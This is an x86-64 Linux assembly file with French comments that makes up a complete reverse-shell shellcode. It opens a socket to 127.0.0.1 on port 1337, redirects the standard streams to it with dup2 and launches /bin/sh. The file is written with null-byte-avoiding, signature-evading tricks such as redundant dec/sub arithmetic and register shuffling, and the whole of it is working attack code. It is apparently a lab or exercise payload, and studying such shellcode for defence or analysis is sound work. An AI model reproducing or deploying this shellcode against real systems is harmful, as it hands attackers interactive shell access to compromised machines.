BITS 64

section .data
section .text

global _start

_start:

    ;création du sys_socket 41
    ; int socket(int domain, int type, int protocol);

mov rdi, 0x01 
dec rdi
xor rsi, rsi

mov rdx, 0x01 
dec rdx

mov rax, 0xFF 
sub rax, 0xFF

    ;param1
    mov dil, 0x2        ;famille du socket

    ;param2
    mov sil, 0x1        ;type du socket

    ;param3
    ;mov rdx, 0x4        ;protocole du socket ipv4

    mov al, 41     ;on appelle le sys_socket
    syscall


push r11
push rax
pop r11
mov r12, r11
pop r11
    ;création du sys_connect 42

    ;param1

push rbx
mov rbx, r12
mov rdi, rbx
pop rbx


push r12
xor r12, r12 
mov rsi,r12 
pop r12

mov rdx, 0x01 
dec rdx

mov rax, 0x01 
dec rax

    ;param2
    mov esi, 0xffffffff ;création de l'adresse ip
    sub esi, 0xfeffff80
    push rsi
    push word 0x3905      ;port 1337 en little Endian
    push word 0x2        ;type family
    mov rsi, rsp
 

    ;param3
    mov dl, 24      ;set taille de l'@ ip

    mov al, 42         ;on appelle le sys_connect
    syscall


    ;paramétrage sys_dup2

    ;sortie0

push r12
xor r12, r12 
mov rsi,r12 
pop r12

push 0xFF 
pop rax 
sub rax, 0xFF 

push r10
mov r10, r12
mov rdi, r10
pop r10
    mov sil, 0xFF   ;redirection sortie 0 vers rdi (stream)
    sub sil, 0xFF

    mov al, 33
    syscall

    ;sortie1
xor rsi, rsi

mov rax, 0x01 
dec rax


push r12
pop rdi
    mov sil, 0x1   ;redirection sortie 1 vers rdi (stream)


    mov al, 33
    syscall

    ;sortie2
xor rsi, rsi

mov rax, 0xFF 
sub rax, 0xFF


push r12
pop rdi
    mov sil, 0x2   ;redirection sortie 2 vers rdi (stream)

    mov al, 33
    syscall


    ; 59 opcode
    ; int execve(char *fname, char **argp, char **envp);
    xor eax, eax

push 0xFF 
pop rdi 
sub rdi, 0xFF 

mov rdx, 0x01 
dec rdx

push 0xFF 
pop rsi 
sub rsi, 0xFF 
mov rdi, 0x68732f6e69622f2f
    push rdx            ; délimiteur de stack à 0
    push rdi            ; insertion chaine /bin/sh en stack
    mov rdi, rsp        ; insertion du pointeur de stack dans rdi
    push rdx            ; délimiteur de stack à 0
    push rdi            ; insertion du pointeur dans la stack
    mov rsi, rsp        ; récupération du pointeur de pointeur et mise dans rsi

    add eax, 59        ;execve opcode

    syscall
    